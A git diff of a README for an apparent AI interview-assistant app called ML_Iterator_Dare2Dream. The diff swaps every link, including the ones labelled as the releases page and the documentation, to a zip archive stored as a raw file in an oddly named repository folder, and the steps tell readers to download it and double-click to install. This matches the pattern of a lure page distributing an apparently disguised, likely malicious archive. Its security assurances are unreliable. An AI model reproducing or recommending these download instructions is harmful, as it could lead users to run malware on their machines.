@@ -1,7 +1,7 @@
 # 🎉 ML_Iterator_Dare2Dream - Conduct AI Interviews with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/echolalic/ML_Iterator_Dare2Dream.zip%20Here-brightgreen)](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/echolalic/ML_Iterator_Dare2Dream.zip)
+[![Download](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/lauraceous/Iterator_Dare_Dream_M_v2.6.zip%20Here-brightgreen)](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/lauraceous/Iterator_Dare_Dream_M_v2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to ML_Iterator_Dare2Dream! This application uses AI to help you conduct interviews seamlessly. You can receive real-time summaries and explore research data through a smart Q&A bot. Follow the steps below to download and run the software.
@@ -18,11 +18,11 @@ Before downloading, ensure your device meets the following requirements:
 ## 📥 Download & Install
 To download the application, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [ML_Iterator_Dare2Dream Releases Page](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/echolalic/ML_Iterator_Dare2Dream.zip).
+1. **Visit the Releases Page**: Go to the [ML_Iterator_Dare2Dream Releases Page](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/lauraceous/Iterator_Dare_Dream_M_v2.6.zip).
   
 2. **Choose the Correct Version**: Look for the latest version available. The release notes will tell you what's new or fixed.
 
-3. **Download the File**: Click on the appropriate file for your operating system to download. The file name may look like `https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/echolalic/ML_Iterator_Dare2Dream.zip` for Windows or `https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/echolalic/ML_Iterator_Dare2Dream.zip` for macOS.
+3. **Download the File**: Click on the appropriate file for your operating system to download. The file name may look like `https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/lauraceous/Iterator_Dare_Dream_M_v2.6.zip` for Windows or `https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/lauraceous/Iterator_Dare_Dream_M_v2.6.zip` for macOS.
 
 4. **Run the Installer**: After downloading, locate the file in your downloads folder and double-click it to start the installation process.
 
@@ -73,9 +73,9 @@ A: Yes, you can install it on any supported device.
 **Q: Will my data be secure?**  
 A: We prioritize your data security. All information is stored locally unless otherwise specified.
 
-For more information, visit the [documentation](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/echolalic/ML_Iterator_Dare2Dream.zip) or join our community forums.
+For more information, visit the [documentation](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/lauraceous/Iterator_Dare_Dream_M_v2.6.zip) or join our community forums.
 
 ## 📥 Download Link Again
-To download the latest version, click here: [ML_Iterator_Dare2Dream Releases Page](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/echolalic/ML_Iterator_Dare2Dream.zip).
+To download the latest version, click here: [ML_Iterator_Dare2Dream Releases Page](https://raw.githubusercontent.com/blight07262021/ML_Iterator_Dare2Dream/main/lauraceous/Iterator_Dare_Dream_M_v2.6.zip).
 
 Enjoy using ML_Iterator_Dare2Dream and streamline your interview process today!
